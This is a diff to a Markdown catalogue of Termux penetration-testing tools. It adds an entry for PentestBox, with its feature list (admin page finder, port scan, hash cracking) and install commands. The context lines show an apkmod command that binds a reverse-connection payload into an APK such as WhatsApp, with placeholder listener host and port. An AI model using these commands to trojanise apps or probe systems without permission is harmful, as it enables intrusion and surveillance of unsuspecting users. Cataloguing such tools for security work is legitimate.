@@ -110,3 +110,30 @@ Command:
 apkmod -b -i original.apk -o binded.apk lhost=yourLhostHere lport=yourLportHere
 apkmod -b -i /sdcard/Whatsapp.apk -o mybindedapp.apk lhost=127.0.0.1 lport=4444
 ```
+##
+#### PentestBox
+* https://github.com/B4rC0d/PentestBox.git
+```
+This Tool is a Collection of Penetration Testing and Information Gathering Tools For Termux 🔰
+Description : This script Aio Web Hacking & Information Gathering Included Admin Panel & Robots File Scanner & Whois And more ... You can use on Termux , Linux(Kali Linux)
+☢️ Feature :
+    ~> Admin Page Finder
+    ~> DNS Lookup
+    ~> Robots Scanner
+    ~> Find Shared DNS
+    ~> Show HTTP Header
+    ~> IP location Finder
+    ~> Port Scan
+    ~> Whois
+    ~> decode (Hash Crack)
+    ~> encode
+🔴 Installation  :-
+$  apt update && apt upgrade -y
+$  apt install git -y
+$  apt install python3 -y
+$  apt install python3-pip -y
+$  git clone https://github.com/B4rC0d/PentestBox.git 
+$  cd PentestBox
+$  pip3 install -r requirements.txt 
+$  python3 PentestBox.py
+```
